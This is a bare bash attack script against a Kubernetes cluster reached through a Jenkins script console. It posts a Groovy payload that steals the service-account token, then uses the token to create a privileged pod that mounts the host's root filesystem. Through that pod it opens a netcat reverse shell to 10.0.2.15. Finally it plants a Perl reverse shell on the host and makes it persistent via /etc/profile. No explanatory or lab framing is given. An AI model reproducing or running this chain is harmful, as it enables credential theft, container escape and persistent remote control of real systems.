read -r -d '' POD <<-'EOF'
apiVersion: v1
kind: Pod
metadata:
    name: evil-pod
spec:
    containers:
    - name: evil-container 
      image: ubuntu:latest
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
      volumeMounts:
      - mountPath: /mnt/host
        name: evil-volume
        mountPropagation: Bidirectional
    volumes:
    - name: evil-volume
      hostPath:
        path: /
EOF

cat << EOF > ./groovy.payload
def command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
def proc = command.execute()
proc.waitFor()
println "\${proc.in.text}"
EOF

JENKINS_TOKEN=`curl -d "script=$(<./groovy.payload)" -X POST http://10.104.236.89:8080/scriptText`
# look for images already being used on the cluster.
curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" $KUBE/api/v1/namespaces/default/pods 2>&1| grep -i \"image\":
curl -k -XPOST -H "Content-Type: application/yaml" -H "Authorization: Bearer ${JENKINS_TOKEN}" -d "$POD" https://10.96.0.1:443/api/v1/namespaces/default/pods
curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod
curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Host: blah.com:80" \
    -H "Origin: http://blah.com:80" \
    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
    -H "Sec-WebSocket-Version: 13" \
    'https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=/bin/bash&command=-c&command=apt%20update%26%26apt%20install%20-y%20netcat%3bnetcat%20-e%20/bin/sh%2010.0.2.15%204444&stdin=true&stdout=true&stderr=true'

cat << EOF > /mnt/host/rshell
use Socket;\$i="10.0.2.15";\$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
EOF
echo "/usr/bin/perl -U /rshell &" >> /etc/profile

